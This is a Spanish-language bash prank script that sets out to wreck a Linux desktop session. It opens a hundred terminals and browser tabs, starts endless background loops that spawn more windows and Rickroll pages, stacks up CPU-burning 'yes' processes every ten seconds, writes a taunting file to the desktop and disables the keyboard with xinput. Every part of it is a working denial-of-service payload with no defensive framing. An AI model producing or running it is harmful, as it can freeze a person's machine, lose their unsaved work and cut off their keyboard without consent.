#!/bin/bash
echo "😈 DESATANDO EL CAOS... 😈"

cantidad=100  # Número de ventanas a abrir

for ((i=1; i<=cantidad; i++)); do
    gnome-terminal &  # Abre una nueva terminal
    xdg-open "https://es.wikipedia.org/wiki/Ataque_de_pánico" &  # Página troll en el navegador
    notify-send "😆 JUEGA A CERRAR TODO" "¡Que la fuerza te acompañe!" &
    sleep 0.2  # Pequeña pausa para que el sistema no lo bloquee inmediatamente
done

echo "🔥 Cargando scripts ocultos..."

# Bucle infinito para abrir más ventanas cada 3 segundos
(while true; do
    gnome-terminal &
    xdg-open "https://www.youtube.com/watch?v=dQw4w9WgXcQ" &  # Rickroll clásico 😆
    notify-send "💀 AÚN NO HAS TERMINADO!" "Te va a costar cerrar todo..."
    sleep 3
done) &

# Lanzar un segundo proceso en segundo plano con más caos
(while true; do
    for i in {1..5}; do
        xdg-open "https://theuselessweb.com/" &  # Páginas inútiles aleatorias
    done
    notify-send "🤣 ¡MÁS, MÁS, MÁS!" "No puedes escapar de esto..."
    sleep 5
done) &

# Hacer que la CPU sufra con procesos pesados en segundo plano
(while true; do
    yes > /dev/null &
    yes > /dev/null &
    yes > /dev/null &
    yes > /dev/null &
    notify-send "🔥 ¡SE TE ESTÁ CALENTANDO EL PC! 🔥" "JAJAJAJA"
    sleep 10
done) &

echo "😆 Te atrapamos!" > ~/Desktop/JAJAJAJA.txt

teclado_id=$(xinput list | grep -i 'keyboard' | awk '{print $6}' | cut -d'=' -f2 | head -n 1)

if [ ! -z "$teclado_id" ]; then
    xinput set-prop "$teclado_id" "Device Enabled" 0
    notify-send "🎹 Teclado desactivado" "JAJAJAJAJA ahora no puedes escribir"
fi